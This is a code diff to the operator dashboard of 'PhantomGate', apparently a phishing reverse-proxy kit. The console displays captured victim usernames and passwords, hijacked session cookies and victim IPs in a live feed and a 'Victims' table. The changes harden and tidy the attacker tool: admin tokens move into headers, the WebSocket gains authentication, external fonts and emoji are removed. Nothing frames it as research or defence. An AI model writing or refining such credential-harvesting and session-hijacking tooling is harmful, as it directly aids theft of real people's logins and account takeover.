@@ -7,7 +7,6 @@ const dashboardHTML = `<!DOCTYPE html>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>PhantomGate — Operator Console</title>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
       --bg-primary: #0a0a0f;
@@ -22,8 +21,8 @@ const dashboardHTML = `<!DOCTYPE html>
       --green: #22c55e;
       --yellow: #eab308;
       --blue: #3b82f6;
-      --font-mono: 'JetBrains Mono', monospace;
-      --font-sans: 'Inter', sans-serif;
+      --font-mono: 'SF Mono', 'Cascadia Code', 'Fira Code', 'Consolas', 'Liberation Mono', monospace;
+      --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -36,7 +35,6 @@ const dashboardHTML = `<!DOCTYPE html>
       overflow-x: hidden;
     }
 
-    /* Scanline overlay */
     body::before {
       content: '';
       position: fixed;
@@ -95,7 +93,6 @@ const dashboardHTML = `<!DOCTYPE html>
       50% { opacity: 0.7; box-shadow: 0 0 0 6px rgba(34, 197, 94, 0); }
     }
 
-    /* Stats Row */
     .stats-row {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
@@ -140,7 +137,6 @@ const dashboardHTML = `<!DOCTYPE html>
     .stat-card.sessions .value { color: var(--green); }
     .stat-card.lures .value { color: var(--blue); }
 
-    /* Main Grid */
     .main-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -183,7 +179,6 @@ const dashboardHTML = `<!DOCTYPE html>
     .panel-body::-webkit-scrollbar-track { background: transparent; }
     .panel-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
 
-    /* Live Feed */
     .feed-item {
       display: flex;
       gap: 12px;
@@ -242,7 +237,6 @@ const dashboardHTML = `<!DOCTYPE html>
       white-space: nowrap;
     }
 
-    /* Victim Table */
     .victim-table {
       width: 100%;
       border-collapse: collapse;
@@ -281,10 +275,8 @@ const dashboardHTML = `<!DOCTYPE html>
     .captured-badge.yes { background: rgba(34,197,94,0.15); color: var(--green); }
     .captured-badge.no { background: rgba(113,113,122,0.15); color: var(--text-secondary); }
 
-    /* Full Width Panel */
     .full-width { grid-column: 1 / -1; }
 
-    /* Terminal Log */
     .terminal {
       background: #000;
       border-radius: 8px;
@@ -302,7 +294,6 @@ const dashboardHTML = `<!DOCTYPE html>
     .terminal .line.warn { color: var(--yellow); }
     .terminal .line .ts { color: var(--text-secondary); }
 
-    /* Empty State */
     .empty-state {
       text-align: center;
       padding: 40px 20px;
@@ -313,7 +304,6 @@ const dashboardHTML = `<!DOCTYPE html>
 
     .empty-state .icon { font-size: 40px; margin-bottom: 12px; opacity: 0.5; }
 
-    /* Auth Screen */
     .auth-overlay {
       position: fixed;
       inset: 0;
@@ -375,24 +365,31 @@ const dashboardHTML = `<!DOCTYPE html>
     }
 
     .auth-box button:hover { background: #dc2626; transform: translateY(-1px); }
+
+    .auth-error {
+      color: var(--accent);
+      font-family: var(--font-mono);
+      font-size: 12px;
+      margin-bottom: 12px;
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-<!-- Auth Overlay -->
 <div class="auth-overlay" id="authOverlay">
   <div class="auth-box">
-    <h2>⚡ PHANTOMGATE</h2>
+    <h2>PHANTOMGATE</h2>
     <p>Operator Authentication Required</p>
+    <div class="auth-error" id="authError">Invalid password</div>
     <input type="password" id="authPass" placeholder="Enter admin password..." autofocus>
     <button onclick="authenticate()">ACCESS CONSOLE</button>
   </div>
 </div>
 
-<!-- Dashboard -->
 <div id="dashboard" style="display:none;">
   <div class="header">
-    <h1>⚡ PHANTOMGATE <span>// Operator Console</span></h1>
+    <h1>PHANTOMGATE <span>// Operator Console</span></h1>
     <div class="status-badge">PROXY ACTIVE</div>
   </div>
 
@@ -416,36 +413,33 @@ const dashboardHTML = `<!DOCTYPE html>
   </div>
 
   <div class="main-grid">
-    <!-- Live Feed -->
     <div class="panel">
       <div class="panel-header">
-        <h2>🔴 Live Feed</h2>
+        <h2>Live Feed</h2>
       </div>
       <div class="panel-body" id="liveFeed">
         <div class="empty-state">
-          <div class="icon">📡</div>
+          <div class="icon">.</div>
           Waiting for victim connections...
         </div>
       </div>
     </div>
 
-    <!-- Victim Table -->
     <div class="panel">
       <div class="panel-header">
-        <h2>🎯 Victims</h2>
+        <h2>Victims</h2>
       </div>
       <div class="panel-body" id="victimPanel">
         <div class="empty-state">
-          <div class="icon">👤</div>
+          <div class="icon">.</div>
           No victims captured yet
         </div>
       </div>
     </div>
 
-    <!-- Terminal Log -->
     <div class="panel full-width">
       <div class="panel-header">
-        <h2>📟 System Log</h2>
+        <h2>System Log</h2>
       </div>
       <div class="panel-body">
         <div class="terminal" id="terminalLog">
@@ -461,9 +455,13 @@ const dashboardHTML = `<!DOCTYPE html>
 let adminToken = '';
 let ws = null;
 
+function authHeaders() {
+  return { 'X-Admin-Token': adminToken, 'Content-Type': 'application/json' };
+}
+
 function authenticate() {
   adminToken = document.getElementById('authPass').value;
-  fetch('/api/stats?token=' + adminToken)
+  fetch('/api/stats', { headers: authHeaders() })
     .then(r => {
       if (r.status === 401) throw new Error('Unauthorized');
       return r.json();
@@ -477,9 +475,9 @@ function authenticate() {
       setInterval(refreshData, 5000);
     })
     .catch(() => {
+      document.getElementById('authError').style.display = 'block';
       document.getElementById('authPass').style.borderColor = '#ef4444';
       document.getElementById('authPass').value = '';
-      document.getElementById('authPass').placeholder = 'Invalid password...';
     });
 }
 
@@ -489,7 +487,7 @@ document.getElementById('authPass').addEventListener('keydown', (e) => {
 
 function connectWS() {
   const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  ws = new WebSocket(proto + '//' + location.host + '/ws');
+  ws = new WebSocket(proto + '//' + location.host + '/ws?token=' + encodeURIComponent(adminToken));
   ws.onopen = () => addLog('WebSocket connected to proxy engine', 'info');
   ws.onclose = () => { addLog('WebSocket disconnected, reconnecting...', 'warn'); setTimeout(connectWS, 3000); };
   ws.onmessage = (e) => {
@@ -500,7 +498,6 @@ function connectWS() {
 
 function handleEvent(msg) {
   const feed = document.getElementById('liveFeed');
-  // Clear empty state
   const empty = feed.querySelector('.empty-state');
   if (empty) empty.remove();
 
@@ -510,19 +507,19 @@ function handleEvent(msg) {
   switch (msg.type) {
     case 'credential':
       item.className = 'feed-item credential';
-      item.innerHTML = '<div class="feed-icon">🔑</div><div class="feed-content"><span class="tag cred">CREDENTIAL</span><br>User: <b>' + escHTML(msg.data.username) + '</b><br>Pass: <b>' + escHTML(msg.data.password) + '</b><br>IP: ' + escHTML(msg.data.source_ip) + '</div><div class="feed-time">' + now + '</div>';
-      addLog('🔑 CREDENTIAL CAPTURED: ' + msg.data.username, 'error');
+      item.innerHTML = '<div class="feed-icon">K</div><div class="feed-content"><span class="tag cred">CREDENTIAL</span><br>User: <b>' + escHTML(msg.data.username) + '</b><br>Pass: <b>' + escHTML(msg.data.password) + '</b><br>IP: ' + escHTML(msg.data.source_ip) + '</div><div class="feed-time">' + now + '</div>';
+      addLog('CREDENTIAL CAPTURED: ' + msg.data.username, 'error');
       break;
     case 'session':
       item.className = 'feed-item session';
       const tokens = Object.keys(msg.data.cookies || {}).join(', ');
-      item.innerHTML = '<div class="feed-icon">🍪</div><div class="feed-content"><span class="tag sess">SESSION</span><br>Tokens: <b>' + escHTML(tokens) + '</b><br>Victim: ' + escHTML(msg.data.victim_id).substring(0,12) + '...</div><div class="feed-time">' + now + '</div>';
-      addLog('🍪 SESSION HIJACKED: ' + tokens, 'error');
+      item.innerHTML = '<div class="feed-icon">C</div><div class="feed-content"><span class="tag sess">SESSION</span><br>Tokens: <b>' + escHTML(tokens) + '</b><br>Victim: ' + escHTML(msg.data.victim_id).substring(0,12) + '...</div><div class="feed-time">' + now + '</div>';
+      addLog('SESSION HIJACKED: ' + tokens, 'error');
       break;
     case 'new_victim':
       item.className = 'feed-item victim';
-      item.innerHTML = '<div class="feed-icon">🎯</div><div class="feed-content"><span class="tag new">NEW VICTIM</span><br>IP: <b>' + escHTML(msg.data.ip) + '</b><br>ID: ' + escHTML(msg.data.id).substring(0,12) + '...</div><div class="feed-time">' + now + '</div>';
-      addLog('🎯 New victim connected: ' + msg.data.ip);
+      item.innerHTML = '<div class="feed-icon">T</div><div class="feed-content"><span class="tag new">NEW VICTIM</span><br>IP: <b>' + escHTML(msg.data.ip) + '</b><br>ID: ' + escHTML(msg.data.id).substring(0,12) + '...</div><div class="feed-time">' + now + '</div>';
+      addLog('New victim connected: ' + msg.data.ip);
       break;
   }
 
@@ -531,7 +528,7 @@ function handleEvent(msg) {
 }
 
 function refreshData() {
-  fetch('/api/stats?token=' + adminToken).then(r => r.json()).then(updateStats);
+  fetch('/api/stats', { headers: authHeaders() }).then(r => r.json()).then(updateStats);
   fetchVictims();
 }
 
@@ -542,7 +539,7 @@ function updateStats(data) {
 }
 
 function fetchVictims() {
-  fetch('/api/victims?token=' + adminToken).then(r => r.json()).then(victims => {
+  fetch('/api/victims', { headers: authHeaders() }).then(r => r.json()).then(victims => {
     const panel = document.getElementById('victimPanel');
     if (!victims || victims.length === 0) return;
     let html = '<table class="victim-table"><thead><tr><th>ID</th><th>IP</th><th>Creds</th><th>Session</th><th>First Seen</th></tr></thead><tbody>';
@@ -550,8 +547,8 @@ function fetchVictims() {
       const hasCreds = v.credentials && v.credentials.length > 0;
       const hasSess = v.sessions && v.sessions.length > 0;
       html += '<tr><td>' + escHTML(v.id).substring(0,12) + '...</td><td>' + escHTML(v.ip) + '</td>';
-      html += '<td><span class="captured-badge ' + (hasCreds ? 'yes' : 'no') + '">' + (hasCreds ? '✓ Captured' : 'Pending') + '</span></td>';
-      html += '<td><span class="captured-badge ' + (hasSess ? 'yes' : 'no') + '">' + (hasSess ? '✓ Hijacked' : 'Pending') + '</span></td>';
+      html += '<td><span class="captured-badge ' + (hasCreds ? 'yes' : 'no') + '">' + (hasCreds ? 'Captured' : 'Pending') + '</span></td>';
+      html += '<td><span class="captured-badge ' + (hasSess ? 'yes' : 'no') + '">' + (hasSess ? 'Hijacked' : 'Pending') + '</span></td>';
       html += '<td>' + new Date(v.first_seen).toLocaleString() + '</td></tr>';
     });
     html += '</tbody></table>';
